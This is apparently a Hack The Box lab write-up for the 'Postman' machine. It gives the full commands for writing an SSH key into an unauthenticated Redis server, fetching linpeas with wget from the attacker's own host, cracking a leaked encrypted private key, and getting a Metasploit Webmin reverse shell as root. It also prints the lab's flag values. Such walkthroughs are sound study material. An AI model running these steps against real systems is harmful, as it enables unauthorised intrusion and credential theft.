---
title: "Postman"
excerpt: "HTB: an unauthenticated Redis lets me write an SSH key for RCE as redis, linpeas finds Matt's encrypted id_rsa which cracks to a password, then a Webmin 1.910 packageup RCE gives root."
date: 2026-10-01
tag: htb
draft: false
---

| | |
|---|---|
| **Target** | `10.129.78.195` |
| **Host** | `POSTMAN` |
| **OS** | Linux |
| **Chain** | Unauthenticated Redis → write SSH key for RCE as `redis` → crack Matt's encrypted `id_rsa.bak` → `su Matt` → user.txt → Webmin 1.910 packageup RCE → root |

> Note:
> Remember, I am showing here only the final good path on how to do this box, dont be discouraged if your's doesnt look like this, because mine didnt. There was a lot of googling, searching, learning and taking wrong turns in between.

## Recon

nmap:
```text
> nmap -sV -sC 10.129.78.195              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 04:37 -0400
Nmap scan report for 10.129.78.195
Host is up (0.036s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.66 seconds
```

### Back to recon

After checking each of these I didnt find anything so I came back to recon.
```text
> nmap -sU --top-ports 100 postman.htb   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 05:27 -0400
Nmap scan report for postman.htb (10.129.78.195)
Host is up (0.035s latency).
Not shown: 62 closed udp ports (port-unreach), 37 open|filtered udp ports (no-response)
PORT      STATE SERVICE
10000/udp open  ndmp

Nmap done: 1 IP address (1 host up) scanned in 59.03 seconds
```

```text
> nmap -p- -T5 postman.htb 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 05:31 -0400
Warning: 10.129.78.195 giving up on port because retransmission cap hit (2).
Nmap scan report for postman.htb (10.129.78.195)
Host is up (0.036s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 34.78 seconds
```
And there it is, redis on port 6379.

### Redis is unauthenticated

```text
> nmap -p6379 postman.htb -sV --script redis-info
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 05:33 -0400
Nmap scan report for postman.htb (10.129.78.195)
Host is up (0.037s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 670
|   Used CPU (sys): 2.72
|   Used CPU (user): 1.01
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 821.52K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.15.40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
```

```text
> redis-cli -h 10.129.78.195                                  
10.129.78.195:6379> ping
PONG
```

## Exploitation

### Redis to SSH RCE

I use the fact that redis is unauthenticated to gain RCE by pasting my ssh key.

```bash
ssh-keygen -t rsa -f ./rediskey -N ""
(echo -e '\n\n'; cat rediskey.pub; echo -e '\n\n') > key.txt
```
```bash
redis-cli -h $TARGET flushall
```
```bash
cat key.txt | redis-cli -h $TARGET -x set pwn
```
```bash
redis-cli -h $TARGET config set dir /var/lib/redis/.ssh
```
```bash
redis-cli -h $TARGET config set dbfilename authorized_keys
```
```bash
redis-cli -h $TARGET save
```
```bash
ssh -i ./rediskey redis@$TARGET
```

### linpeas and Matt's key

Next I transport and start `linpeas`.
```bash
python3 -m http.server $PORT
```

```bash
wget http://YOUR_IP:PORT/linpeas.sh
```

```bash
chmod +x linpeas.sh && ./linpeas.sh > linpeas
```

And while looking at it, I found gold:
```text
<SNIP>
╔══════════╣ Analyzing SSH Files (limit 70)

-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
<SNIP>
```

### Cracking the key

I saved it.
```bash
nano matt_key
```

Converted it.
```bash
ssh2john matt_key > hash.txt 
```

Then cracked.
```text
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (matt_key)     
1g 0:00:00:00 DONE (2026-10-01 04:48) 1.886g/s 465690p/s 465690c/s 465690C/s confused6..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

And I got `Matt` : `computer2008`.

### su to Matt

Next I switched user on the ssh session from earlier and typed `computer2008` as password.
```bash
su Matt
```

```text
Matt@Postman:~$ cat user.txt 
6ddb23fabe7677a84c49e6d58d563f23
```

`user.txt` : `6ddb23fabe7677a84c49e6d58d563f23`

## Privilege Escalation

### Webmin RCE

Now since I have `Matt` credentials, I went and used them on the `Webmin` panel on port 10000.
They worked, so I went to metasploit and checked modules for it. The one working was `linux/http/webmin_packageup_rce`.

![Webmin packageup RCE module in metasploit](/images/postman/1.webp)

```bash
use linux/http/webmin_packageup_rce
```

What was annoying for me there, I set up vhost which for some reason was stopping me from getting reverse shell, so I unset it and it worked.
```text
msf exploit(linux/http/webmin_packageup_rce) > run
[*] Started reverse TCP handler on 10.10.15.40:4444 
[+] Session cookie: 2b7e8cb5b5c1dcf407c8a537de35a13e
[*] Attempting to execute the payload...
[*] Exploit completed, but no session was created.
```

```bash
unset VHOST
```

```text
msf exploit(linux/http/webmin_packageup_rce) > run
[*] Started reverse TCP handler on 10.10.15.40:4444 
[+] Session cookie: 2643b1797f703b3ba98efff4cc7c858b
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.15.40:4444 -> 10.129.78.195:40946) at 2026-10-01 06:01:11 -0400
```

### root.txt

```text
cat root.txt
c54036931a9f4219c0cacd16f17a5f8a
```

`root.txt` : `c54036931a9f4219c0cacd16f17a5f8a`

GG.
